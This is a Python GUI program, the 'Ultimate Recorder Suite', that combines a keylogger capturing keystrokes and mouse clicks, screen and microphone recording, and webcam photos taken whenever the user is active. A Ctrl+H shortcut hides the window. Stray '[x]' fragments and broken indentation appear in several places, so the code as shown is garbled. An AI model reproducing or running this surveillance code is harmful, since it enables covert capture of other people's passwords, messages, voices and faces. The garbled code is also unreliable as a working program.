import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import sounddevice as sd
import numpy as np
import scipy.io.wavfile as wav
import threading
import time
import keyboard
from pynput import keyboard as pynput_keyboard
from pynput import mouse
import os
import json
import cv2
import pyautogui
from datetime import datetime
from PIL import Image, ImageTk
import queue
import sys

# ============ CONFIGURATION MANAGER ============
class ConfigManager:
    def __init__(self):
        self.config_file = "recorder_config.json"
        self.default_config = {
            "voice": {
                "sample_rate": 44100,
                "channels": 1,
                "format": "int16",
                "save_path": "recordings/voice"
            },
            "screen": {
                "fps": 20,
                "save_path": "recordings/screen",
                "quality": "high"
            },
            "keylogger": {
                "log_file": "keylog.txt",
                "max_log_size_mb": 5,
                "log_mouse": True,
                "save_path": "logs"
            },
            "camera": {
                "camera_id": 0,
                "capture_on_activity": True,
                "capture_interval": 30,
                "save_path": "recordings/photos",
                "resolution": [640, 480]
            },
            "app": {
                "theme": "dark",
                "auto_save": True,
                "minimize_to_tray": False
            }
        }
        self.config = self.load_config()
        self.create_directories()
    
    def load_config(self):
        if os.path.exists(self.config_file):
            with open(self.config_file, 'r') as f:
                return json.load(f)
        else:
            self.save_config(self.default_config)
            return self.default_config
    
    def save_config(self, config=None):
        if config is None:
            config = self.config
        with open(self.config_file, 'w') as f:
            json.dump(config, f, indent=4)
    
    def create_directories(self):
        for key in self.config:
            if 'save_path' in self.config[key]:
                os.makedirs(self.config[key]['save_path'], exist_ok=True)

# ============ VOICE RECORDER ============
class VoiceRecorderGUI:
    def __init__(self, parent, config):
        self.parent = parent
        self.config = config
        self.recording = False
        self.audio_data = []
        self.stream = None
        
    def record(self):
        self.recording = True
        self.audio_data = []
        
        def callback(indata, frames, time, status):
            if self.recording:
                self.audio_data.append(indata.copy())
        
        self.stream = sd.InputStream(
            samplerate=self.config['voice']['sample_rate'],
            channels=self.config['voice']['channels'],
            callback=callback,
            dtype=self.config['voice']['format']
        )
        self.stream.start()
    
    def stop(self):
        self.recording = False
        if self.stream:
            self.stream.stop()
            self.stream.close()
        
        audio = np.concatenate(self.audio_data, axis=0)
        filename = f"{self.config['voice']['save_path']}/voice_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
        wav.write(filename, self.config['voice']['sample_rate'], audio)
        return filename

# ============ SCREEN RECORDER ============
class ScreenRecorderGUI:
    def __init__(self, parent, config):
        self.parent = parent
        self.config = config
        self.recording = False
        self.out = None
        self.recording_thread = None
        
    def start_recording(self):
        screen_size = pyautogui.size()
        filename = f"{self.config['screen']['save_path']}/screen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
        
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        self.out = cv2.VideoWriter(filename, fourcc, self.config['screen']['fps'], screen_size)
        
        self.recording = True
        self.recording_thread = threading.Thread(target=self._record)
        self.recording_thread.start()
        return filename
    
    def _record(self):
        while self.recording:
            screenshot = pyautogui.screenshot()
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            self.out.write(frame)
            time.sleep(1.0 / self.config['screen']['fps'])
    
    def stop_recording(self):
        self.recording = False
        if self.recording_thread:
            self.recording_thread.join()
        if self.out:
            self.out.release()

# ============ PHOTO CAPTURE ============
class PhotoCapture:
    def __init__(self, parent, config, log_callback):
        self.parent = parent
        self.config = config
        self.log_callback = log_callback
        self.camera = None
        self.capturing = False
        self.capture_thread = None
        self.last_capture_time = 0
        self.preview_running = False
        self.preview_thread = None
        self.preview_canvas = None
        
    def init_camera(self):
        try:
            camera_id = self.config['camera']['camera_id']
            self.camera = cv2.VideoCapture(camera_id)
            width, height = self.config['camera']['resolution']
            self.camera.set(cv2.CAP_PROP_FRAME_WIDTH, width)
            self.camera.set(cv2.CAP_PROP_FRAME_HEIGHT, height)
            return True
        except Exception as e:
            self.log_callback(f"❌ Camera initialization failed: {e}")
            return False
    
    def capture_photo(self):
        if self.camera is None:
            if not self.init_camera():
                return None
        
        try:
            ret, frame = self.camera.read()
            if ret:
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
                filename = f"{self.config['camera']['save_path']}/photo_{timestamp}.jpg"
                cv2.imwrite(filename, frame)
                self.log_callback(f"📸 Photo captured: {os.path.basename(filename)}")
                self.last_capture_time = time.time()
                return filename
            else:
                self.log_callback("❌ Failed to capture photo")
                return None
        except Exception as e:
            self.log_callback(f"❌ Photo capture error: {e}")
            return None
    
    def start_activity_monitoring(self):
        if self.capturing:
            return
        
        self.capturing = True
        self.capture_thread = threading.Thread(target=self._monitor_activity)
        self.capture_thread.daemon = True
        self.capture_thread.start()
        self.log_callback("📸 Activity monitoring started")
    
    def _monitor_activity(self):
        from pynput import mouse as pynput_mouse
        from pynput import keyboard as pynput_keyboard
        
        last_activity = time.time()
        
        def on_activity():
            nonlocal last_activity
            current_time = time.time()
            interval = self.config['camera']['capture_interval']
            
            if current_time - last_activity >= interval:
                last_activity = current_time
                if self.config['camera']['capture_on_activity']:
                    self.capture_photo()
        
        mouse_listener = pynput_mouse.Listener(
            on_move=lambda x, y: on_activity(),
            on_click=lambda x, y, b, p: on_activity(),
            on_scroll=lambda x, y, dx, dy: on_activity()
        )
        
        keyboard_listener = pynput_keyboard.Listener(
            on_press=lambda key: on_activity()
        )
        
        mouse_listener.start()
        keyboard_listener.start()
        
        while self.capturing:
            time.sleep(0.5)
        
        mouse_listener.stop()
        keyboard_listener.stop()
    
    def stop_monitoring(self):
        self.capturing = False
        if self.capture_thread:
            self.capture_thread.join(timeout=2)
        self.log_callback("📸 Activity monitoring stopped")
    
    def release_camera(self):
        if self.camera:
            self.camera.release()
            self.camera = None
    
    def start_preview(self, canvas):
        self.preview_canvas = canvas
        self.preview_running = True
        self.preview_thread = threading.Thread(target=self._preview_loop)
        self.preview_thread.daemon = True
        self.preview_thread.start()
    
    def _preview_loop(self):
        if not self.init_camera():
            return
        
        while self.preview_running:
            ret, frame = self.camera.read()
            if ret:
                frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                img = Image.fromarray(frame_rgb)
                img = img.resize((320, 240), Image.Resampling.LANCZOS)
                imgtk = ImageTk.PhotoImage(image=img)
                
                self.preview_canvas.create_image(160, 120, image=imgtk, anchor='center')
                self.preview_canvas.image = imgtk
            
            time.sleep(0.033)
    
    def stop_preview(self):
        self.preview_running = False
        if self.preview_thread:
            self.preview_thread.join(timeout=1)

# ============ KEYLOGGER ============
class KeyloggerGUI:
    def __init__(self, parent, config, log_callback, photo_capture=None):
        self.parent = parent
        self.config = config
        self.log_callback = log_callback
        self.photo_capture = photo_capture
        self.running = False
        self.keys = []
        self.mouse_events = []
        self.keyboard_listener = None
        self.mouse_listener = None
        
    def on_press(self, key):
        try:
            self.keys.append(key.char)
        except AttributeError:
            if key == pynput_keyboard.Key.space:
                self.keys.append(' ')
            elif key == pynput_keyboard.Key.enter:
                self.keys.append('\n')
            elif key == pynput_keyboard.Key.backspace:
                self.keys.append('[BACKSPACE]')
            else:
                self.keys.append(f'[{key}]')
        
        if self.keys:
            self.log_callback(''.join(self.keys[-10:]))
        
        if self.photo_capture and self.photo_capture.config['camera']['capture_on_activity']:
            current_time = time.time()
            if current_time - self.photo_capture.last_capture_time >= self.photo_capture.config['camera']['capture_interval']:
                threading.Thread(target=self.photo_capture.capture_photo).start()
    
    def on_click(self, x, y, button, pressed):
        action = "clicked" if pressed else "released"
        msg = f"Mouse {action} at ({x}, {y}) with {button}"
        self.mouse_events.append(msg)
        self.log_callback(msg)
        
        if self.photo_capture and self.photo_capture.config['camera']['capture_on_activity']:
            threading.Thread(target=self.photo_capture.capture_photo).start()
    
    def start(self):
        self.running = True
        self.keyboard_listener = pynput_keyboard.Listener(on_press=self.on_press)
        self.keyboard_listener.start()
        
        if self.config['keylogger']['log_mouse']:
            self.mouse_listener = mouse.Listener(on_click=self.on_click)
            self.mouse_listener.start()
    
    def stop(self):
        self.running = False
        if self.keyboard_listener:
            self.keyboard_listener.stop()
        if self.mouse_listener:
            self.mouse_listener.stop()
        
        filename = f"{self.config['keylogger']['save_path']}/keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write(f"Keylog saved at: {datetime.now()}\n")
            f.write(''.join(self.keys))
            f.write('\n\n' + '\n'.join(self.mouse_events))
        return filename

# ============ MAIN GUI APPLICATION ============
class RecorderApp:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("🎤🔐🎥 Ultimate Recorder Suite")
        self.root.geometry("1100x750")
        self.root.configure(bg='#1e1e1e')
        self.root.resizable(False, False)
        
        # Initialize components
        self.config_manager = ConfigManager()
        self.voice_recorder = None
        self.screen_recorder = None
        self.keylogger = None
        self.photo_capture = None
        
        # Status variables
        self.voice_status = False
        self.screen_status = False
        self.keylog_status = False
        self.photo_status = False

 # Setup UI
        self.setup_ui()
        
        # Message queue
        self.message_queue = queue.Queue()
        self.process_messages()
        
        # Hide feature
        self.root.bind('<Control-h>', self.toggle_hide)
        self.root.bind('<Control-H>', self.toggle_hide)
        self.hidden = False
    
    def toggle_hide(self, event=None):
        if self.hidden:
            self.root.deiconify()
            self.hidden = False
            self.add_log("🔓 Window shown")
        else:
            self.root.withdraw()
            self.hidden = True
            self.add_log("🔒 Window hidden (Press Ctrl+H to show)")
    
    def setup_ui(self):
        # Title Frame
        title_frame = tk.Frame(self.root, bg='#1e1e1e')
        title_frame.pack(fill='x', padx=20, pady=10)
        
        title = tk.Label(title_frame, text="🎤🔐🎥 ULTIMATE RECORDER SUITE", 
                        font=('Arial', 20, 'bold'), bg='#1e1e1e', fg='#00ff00')
        title.pack()
        
        subtitle = tk.Label(title_frame, text="Professional Recording Tool | Voice | Screen | Keylogger | Photo Capture", 
                           font=('Arial', 10), bg='#1e1e1e', fg='#888888')
        subtitle.pack()
        
        # Main Container
        main_container = tk.Frame(self.root, bg='#1e1e1e')
        main_container.pack(fill='both', expand=True, padx=20, pady=10)
        
        # Left Panel
        left_panel = tk.Frame(main_container, bg='#2d2d2d', relief='ridge', bd=2)
        left_panel.pack(side='left', fill='both', expand=True, padx=(0, 10))
        
        # Voice Recorder
        voice_frame = tk.LabelFrame(left_panel, text="🎤 Voice Recorder", 
                                    font=('Arial', 12, 'bold'), bg='#2d2d2d', fg='#00ff00', 
                                    relief='ridge', bd=2)
        voice_frame.pack(fill='x', padx=10, pady=10)
        
        self.voice_btn = tk.Button(voice_frame, text="🔴 Start Recording", 
                                   command=self.toggle_voice, bg='#ff4444', fg='white',
                                   font=('Arial', 10, 'bold'), height=2)
        self.voice_btn.pack(pady=10, padx=20, fill='x')
        
[x]         self.voice_status_label = tk.Label(voice_frame, text=" Idle", 
                                          font=('Arial', 10), bg='#2d2d2d', fg='#888888')
        self.voice_status_label.pack()
        
        # Screen Recorder
        screen_frame = tk.LabelFrame(left_panel, text="🎥 Screen Recorder", 
                                     font=('Arial', 12, 'bold'), bg='#2d2d2d', fg='#00ff00',
                                     relief='ridge', bd=2)
        screen_frame.pack(fill='x', padx=10, pady=10)
        
        self.screen_btn = tk.Button(screen_frame, text="🎬 Start Recording", 
                                    command=self.toggle_screen, bg='#ff4444', fg='white',
                                    font=('Arial', 10, 'bold'), height=2)
        self.screen_btn.pack(pady=10, padx=20, fill='x')
        
[x]         self.screen_status_label = tk.Label(screen_frame, text=" Idle", 
                                           font=('Arial', 10), bg='#2d2d2d', fg='#888888')
        self.screen_status_label.pack()
        
        # Keylogger Section
        keylog_frame = tk.LabelFrame(left_panel, text="🔐 Keylogger", 
                                     font=('Arial', 12, 'bold'), bg='#2d2d2d', fg='#00ff00',
                                     relief='ridge', bd=2)
        keylog_frame.pack(fill='x', padx=10, pady=10)
        
        self.keylog_btn = tk.Button(keylog_frame, text="🔑 Start Keylogger", 
                                    command=self.toggle_keylogger, bg='#ff4444', fg='white',
                                    font=('Arial', 10, 'bold'), height=2)
        self.keylog_btn.pack(pady=10, padx=20, fill='x')
        
[x]         self.keylog_status_label = tk.Label(keylog_frame, text=" Stopped", 
                                           font=('Arial', 10), bg='#2d2d2d', fg='#888888')
        self.keylog_status_label.pack()
        
        # Photo Capture
        photo_frame = tk.LabelFrame(left_panel, text="📸 Photo Capture", 
                                    font=('Arial', 12, 'bold'), bg='#2d2d2d', fg='#00ff00',
                                    relief='ridge', bd=2)
        photo_frame.pack(fill='x', padx=10, pady=10)
        
        self.photo_btn = tk.Button(photo_frame, text="📸 Start Photo Capture", 
                                   command=self.toggle_photo_capture, bg='#ff4444', fg='white',
                                   font=('Arial', 10, 'bold'), height=2)
        self.photo_btn.pack(pady=10, padx=20, fill='x')
        
        self.manual_capture_btn = tk.Button(photo_frame, text="📷 Capture Now", 
                                            command=self.capture_photo_manual, bg='#4444ff', fg='white',
                                            font=('Arial', 9, 'bold'), height=1)
        self.manual_capture_btn.pack(pady=5, padx=20, fill='x')
        
[x]         self.photo_status_label = tk.Label(photo_frame, text=" Stopped", 
                                          font=('Arial', 10), bg='#2d2d2d', fg='#888888')
        self.photo_status_label.pack()
        
        preview_label = tk.Label(photo_frame, text="Camera Preview", 
                                 font=('Arial', 9, 'bold'), bg='#2d2d2d', fg='#00ff00')
        preview_label.pack(pady=5)
        
        self.preview_canvas = tk.Canvas(photo_frame, width=320, height=240, bg='#000000', bd=2, relief='solid')
        self.preview_canvas.pack(pady=5)
        
        # Settings Button
        settings_btn = tk.Button(left_panel, text="⚙️ Settings", 
                                 command=self.open_settings, bg='#555555', fg='white',
                                 font=('Arial', 10, 'bold'), height=2)
        settings_btn.pack(pady=10, padx=20, fill='x')
        
        # Right Panel - Live Log
        right_panel = tk.Frame(main_container, bg='#2d2d2d', relief='ridge', bd=2)
        right_panel.pack(side='right', fill='both', expand=True)
        
        log_label = tk.Label(right_panel, text="📋 Live Activity Log", 
                            font=('Arial', 12, 'bold'), bg='#2d2d2d', fg='#00ff00')
        log_label.pack(pady=10)
        
        self.log_area = scrolledtext.ScrolledText(right_panel, height=35, width=45,
                                                  bg='#1e1e1e', fg='#00ff00',
                                                  insertbackground='white',
                                                  font=('Consolas', 9))
        self.log_area.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Status Bar
        self.status_bar = tk.Label(self.root, text="Ready | All systems operational", 
                                   bg='#2d2d2d', fg='#888888', relief='sunken')
        self.status_bar.pack(fill='x', side='bottom')
    
    def toggle_voice(self):
        if not self.voice_status:
            self.voice_recorder = VoiceRecorderGUI(self.root, self.config_manager.config)
            self.voice_recorder.record()
            self.voice_status = True
            self.voice_btn.config(text="⏹️ Stop Recording", bg='#44ff44', fg='black')
[x]             self.voice_status_label.config(text=" Recording...", fg='#ff4444')
            self.add_log("🎤 Voice recording started")
        else:
            filename = self.voice_recorder.stop()
            self.voice_status = False
            self.voice_btn.config(text="🔴 Start Recording", bg='#ff4444', fg='white')
[x]             self.voice_status_label.config(text=" Idle", fg='#888888')
            self.add_log(f"✅ Voice saved: {filename}")
    
    def toggle_screen(self):
        if not self.screen_status:
            self.screen_recorder = ScreenRecorderGUI(self.root, self.config_manager.config)
            filename = self.screen_recorder.start_recording()
            self.screen_status = True
            self.screen_btn.config(text="⏹️ Stop Recording", bg='#44ff44', fg='black')
[x]             self.screen_status_label.config(text=" Recording...", fg='#ff4444')
            self.add_log(f"🎥 Screen recording started")
        else:
            self.screen_recorder.stop_recording()
            self.screen_status = False
            self.screen_btn.config(text="🎬 Start Recording", bg='#ff4444', fg='white')
[x]             self.screen_status_label.config(text=" Idle", fg='#888888')
            self.add_log("✅ Screen recording stopped")
    
    def toggle_keylogger(self):
        if not self.keylog_status:
            self.keylogger = KeyloggerGUI(self.root, self.config_manager.config, self.add_log, self.photo_capture if self.photo_status else None)
            self.keylogger.start()
            self.keylog_status = True
            self.keylog_btn.config(text="⏹️ Stop Keylogger", bg='#44ff44', fg='black')
[x]             self.keylog_status_label.config(text=" Running", fg='#ff4444')
            self.add_log("🔐 Keylogger started")
        else:
            filename = self.keylogger.stop()
            self.keylog_status = False
            self.keylog_btn.config(text="🔑 Start Keylogger", bg='#ff4444', fg='white')
[x]             self.keylog_status_label.config(text=" Stopped", fg='#888888')
            self.add_log(f"✅ Keylogger stopped. Logs saved: {filename}")
    
    def toggle_photo_capture(self):
        if not self.photo_status:
            self.photo_capture = PhotoCapture(self.root, self.config_manager.config, self.add_log)
            if self.photo_capture.init_camera():
                self.photo_capture.start_activity_monitoring()
                self.photo_capture.start_preview(self.preview_canvas)
                self.photo_status = True
                self.photo_btn.config(text="⏹️ Stop Photo Capture", bg='#44ff44', fg='black')
[x]                 self.photo_status_label.config(text=" Active", fg='#ff4444')
                self.add_log("📸 Photo capture started")
            else:
                messagebox.showerror("Camera Error", "Could not initialize camera")
        else:
            self.photo_capture.stop_monitoring()
            self.photo_capture.stop_preview()
            self.photo_capture.release_camera()
            self.photo_status = False
            self.photo_btn.config(text="📸 Start Photo Capture", bg='#ff4444', fg='white')
[x]             self.photo_status_label.config(text=" Stopped", fg='#888888')
            self.preview_canvas.delete("all")
            self.add_log("📸 Photo capture stopped")
    
    def capture_photo_manual(self):
        if self.photo_status and self.photo_capture:
            self.photo_capture.capture_photo()
        else:
            temp_capture = PhotoCapture(self.root, self.config_manager.config, self.add_log)
            if temp_capture.init_camera():
                temp_capture.capture_photo()
                temp_capture.release_camera()
                self.add_log("📸 Manual photo captured")
            else:
                messagebox.showerror("Camera Error", "Could not access camera")
    
    def open_settings(self):
        settings_window = tk.Toplevel(self.root)
        settings_window.title("Settings")
        settings_window.geometry("600x500")
        settings_window.configure(bg='#2d2d2d')
        settings_window.transient(self.root)
        settings_window.grab_set()

notebook = ttk.Notebook(settings_window)
        notebook.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Voice Settings
        voice_frame = tk.Frame(notebook, bg='#2d2d2d')
        notebook.add(voice_frame, text="🎤 Voice")
        
        tk.Label(voice_frame, text="Sample Rate:", bg='#2d2d2d', fg='white').grid(row=0, column=0, pady=5, padx=10, sticky='w')
        sample_rate_var = tk.StringVar(value=str(self.config_manager.config['voice']['sample_rate']))
        tk.Entry(voice_frame, textvariable=sample_rate_var, bg='#1e1e1e', fg='white').grid(row=0, column=1, pady=5, padx=10)
        
        tk.Label(voice_frame, text="Save Path:", bg='#2d2d2d', fg='white').grid(row=1, column=0, pady=5, padx=10, sticky='w')
        save_path_var = tk.StringVar(value=self.config_manager.config['voice']['save_path'])
        tk.Entry(voice_frame, textvariable=save_path_var, bg='#1e1e1e', fg='white', width=30).grid(row=1, column=1, pady=5, padx=10)
        
        # Screen Settings
        screen_frame = tk.Frame(notebook, bg='#2d2d2d')
        notebook.add(screen_frame, text="🎥 Screen")
        
        tk.Label(screen_frame, text="FPS:", bg='#2d2d2d', fg='white').grid(row=0, column=0, pady=5, padx=10, sticky='w')
        fps_var = tk.StringVar(value=str(self.config_manager.config['screen']['fps']))
        tk.Entry(screen_frame, textvariable=fps_var, bg='#1e1e1e', fg='white').grid(row=0, column=1, pady=5, padx=10)
        
        tk.Label(screen_frame, text="Save Path:", bg='#2d2d2d', fg='white').grid(row=1, column=0, pady=5, padx=10, sticky='w')
        screen_path_var = tk.StringVar(value=self.config_manager.config['screen']['save_path'])
        tk.Entry(screen_frame, textvariable=screen_path_var, bg='#1e1e1e', fg='white', width=30).grid(row=1, column=1, pady=5, padx=10)
        
        # Camera Settings
        camera_frame = tk.Frame(notebook, bg='#2d2d2d')
        notebook.add(camera_frame, text="📸 Camera")
        
        tk.Label(camera_frame, text="Camera ID:", bg='#2d2d2d', fg='white').grid(row=0, column=0, pady=5, padx=10, sticky='w')
        camera_id_var = tk.StringVar(value=str(self.config_manager.config['camera']['camera_id']))
        tk.Entry(camera_frame, textvariable=camera_id_var, bg='#1e1e1e', fg='white').grid(row=0, column=1, pady=5, padx=10)
        
        tk.Label(camera_frame, text="Capture Interval (sec):", bg='#2d2d2d', fg='white').grid(row=1, column=0, pady=5, padx=10, sticky='w')
        interval_var = tk.StringVar(value=str(self.config_manager.config['camera']['capture_interval']))
        tk.Entry(camera_frame, textvariable=interval_var, bg='#1e1e1e', fg='white').grid(row=1, column=1, pady=5, padx=10)
        
        tk.Label(camera_frame, text="Save Path:", bg='#2d2d2d', fg='white').grid(row=2, column=0, pady=5, padx=10, sticky='w')
        camera_path_var = tk.StringVar(value=self.config_manager.config['camera']['save_path'])
        tk.Entry(camera_frame, textvariable=camera_path_var, bg='#1e1e1e', fg='white', width=30).grid(row=2, column=1, pady=5, padx=10)
        
        capture_on_activity_var = tk.BooleanVar(value=self.config_manager.config['camera']['capture_on_activity'])
        tk.Checkbutton(camera_frame, text="Capture on User Activity", variable=capture_on_activity_var, 
                      bg='#2d2d2d', fg='white').grid(row=3, column=0, columnspan=2, pady=5)
        
        # Keylogger Settings
        keylog_frame = tk.Frame(notebook, bg='#2d2d2d')
        notebook.add(keylog_frame, text="🔐 Keylogger")
        
        tk.Label(keylog_frame, text="Save Path:", bg='#2d2d2d', fg='white').grid(row=0, column=0, pady=5, padx=10, sticky='w')
        keylog_path_var = tk.StringVar(value=self.config_manager.config['keylogger']['save_path'])
        tk.Entry(keylog_frame, textvariable=keylog_path_var, bg='#1e1e1e', fg='white', width=30).grid(row=0, column=1, pady=5, padx=10)
        
        log_mouse_var = tk.BooleanVar(value=self.config_manager.config['keylogger']['log_mouse'])
        tk.Checkbutton(keylog_frame, text="Log Mouse Events", variable=log_mouse_var, 
                      bg='#2d2d2d', fg='white').grid(row=1, column=0, columnspan=2, pady=5)
        
        def save_settings():
            self.config_manager.config['voice']['sample_rate'] = int(sample_rate_var.get())
            self.config_manager.config['voice']['save_path'] = save_path_var.get()
            self.config_manager.config['screen']['fps'] = int(fps_var.get())
            self.config_manager.config['screen']['save_path'] = screen_path_var.get()
            self.config_manager.config['camera']['camera_id'] = int(camera_id_var.get())
            self.config_manager.config['camera']['capture_interval'] = int(interval_var.get())
            self.config_manager.config['camera']['save_path'] = camera_path_var.get()
            self.config_manager.config['camera']['capture_on_activity'] = capture_on_activity_var.get()
            self.config_manager.config['keylogger']['save_path'] = keylog_path_var.get()
            self.config_manager.config['keylogger']['log_mouse'] = log_mouse_var.get()
            self.config_manager.save_config()
            self.config_manager.create_directories()
            self.add_log("⚙️ Settings saved")
            settings_window.destroy()

tk.Button(settings_window, text="Save Settings", command=save_settings, 
                 bg='#00ff00', fg='black', font=('Arial', 10, 'bold')).pack(pady=10)
    
    def add_log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.message_queue.put(f"[{timestamp}] {message}\n")
    
    def process_messages(self):
        try:
            while True:
                msg = self.message_queue.get_nowait()
                self.log_area.insert(tk.END, msg)
                self.log_area.see(tk.END)
        except queue.Empty:
            pass
        finally:
            self.root.after(100, self.process_messages)
    
    def on_closing(self):
        if self.voice_status:
            self.voice_recorder.stop()
        if self.screen_status:
            self.screen_recorder.stop_recording()
        if self.keylog_status:
            self.keylogger.stop()
        if self.photo_status:
            self.photo_capture.stop_monitoring()
            self.photo_capture.release_camera()
        self.root.destroy()
    
    def run(self):
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.root.mainloop()

# ============ ENTRY POINT ============
if __name__ == "__main__":
    app = RecorderApp()
    app.run()
